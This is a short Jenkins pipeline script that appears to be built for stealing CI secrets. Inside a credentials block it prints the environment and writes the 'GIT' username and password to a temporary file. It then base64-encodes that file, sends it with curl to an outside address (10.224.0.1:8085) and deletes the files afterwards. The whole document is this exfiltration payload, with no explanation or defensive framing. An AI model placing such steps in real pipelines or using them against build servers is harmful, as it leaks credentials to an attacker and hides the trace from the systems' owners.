pipeline {
  agent any
    stages {
      stage('usernamePassword') {
      withCredentials([usernamePassword(credentialsId: 'GIT', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD')]) {

          sh '''env
          '''

          sh '''echo "[+] USER:" > /tmp/file
                echo "$USERNAME" >> /tmp/file
                echo "$PASSWORD" >> /tmp/file
                echo >> /tmp/file
          '''
          sh '''base64 /tmp/file > /tmp/out
                curl -d @/tmp/out http://10.224.0.1:8085
                rm /tmp/file
                rm /tmp/out
          '''
      }
    }
  }
}
